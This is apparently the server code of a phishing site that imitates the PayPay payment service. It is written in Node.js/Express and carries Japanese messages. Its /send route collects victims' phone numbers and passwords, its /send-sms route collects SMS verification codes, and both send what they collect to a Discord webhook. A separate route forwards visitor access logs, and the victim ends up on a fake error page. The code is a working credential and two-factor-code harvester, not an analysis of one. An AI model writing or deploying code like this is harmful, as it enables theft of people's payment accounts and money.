const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");
const app = express();
const { getAccessLog } = require("./dist/Access");

const webhook = process.env.DISCORD_WEBHOOK;

app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.get(["/", "/index.html", "/login.html"], (req, res) => {
  if (!req.cookies.pp_session) {
    res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
  }
  res.sendFile(path.join(__dirname, "index.html"));
});


app.get("/sms.html", (req, res) => {
  if (req.cookies.pp_session !== "1") {
    return res.status(403).send(`
      <!DOCTYPE html>
      <html lang="ja">
      <head><meta charset="UTF-8"><title>403 Forbidden</title></head>
      <body style="text-align:center; padding:50px; font-family:sans-serif; background:#f7f7f7;">
        <h1 style="color:#333;">403 Forbidden</h1>
        <p style="color:#666;">不正なアクセスです。最初からやり直してください。</p>
      </body>
      </html>
    `);
  }
  res.sendFile(path.join(__dirname, "sms.html"));
});


app.use(express.static(path.join(__dirname, ".")));




app.post("/send", async (req, res) => {
  const phone = req.body.name;
  const password = req.body.message;

  const safePhone = typeof phone === 'string' ? phone : '';
  const safePassword = typeof password === 'string' ? password : '';
  const cleanPhone = safePhone.replace(/[- ]/g, '');

  
  if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
    return res.redirect("/index.html?error=1");
  }

  try {
    if (!webhook) throw new Error("DISCORD_WEBHOOK is not set");

    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        // 送信データもsafePasswordに統一（元のpasswordから修正）
        content: `\ntel: ${cleanPhone}\npass: ${safePassword}`
      })
    });

    if (!response.ok) {
      console.error(`Webhook送信失敗: Status ${response.status}`);
    } else {
      console.log("送信成功");
    }

    res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
    const telParam = phone ? `?tel=${encodeURIComponent(phone)}` : '';
    res.redirect(`/sms.html${telParam}`);

  } catch (error) {
    console.error("送信失敗:", error);
    res.status(500).send("エラー");
  }
});


app.post("/send-sms", async (req, res) => {
  const smsCode = req.body.sms_code;
  const safeCode = typeof smsCode === 'string' ? smsCode : '';

  if (!/^\d{4}$/.test(safeCode)) {
    return res.redirect("/sms.html?error=1");
  }

  try {
    if (!webhook) throw new Error("DISCORD_WEBHOOK is not set");

    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `\nsms: ${safeCode}`
      })
    });

    if (!response.ok) {
      console.error(`Webhook送信失敗: Status ${response.status}`);
    } else {
      console.log("sms送信成功");
    }
    
    res.redirect("https://qay-paypay.up.railway.app/sms.html?error=2"); 

  } catch (error) {
    console.error("sms送信失敗:", error);
    res.status(500).send("エラー");
  }
});

app.post("/log-access", async (req, res) => {
  const accessWebhook = process.env.ACCESS_WEBHOOK || process.env.DISCORD_WEBHOOK;

  try {
    if (!accessWebhook) throw new Error("ACCESS_WEBHOOK or DISCORD_WEBHOOK is not set");

    const logMessage = await getAccessLog(req, req.body);

    const response = await fetch(accessWebhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: logMessage })
    });

    if (!response.ok) {
      console.error(`Access Webhook送信失敗: Status ${response.status}`);
      return res.status(500).send("Error");
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("Access送信失敗:", error);
    res.status(500).send("Error");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
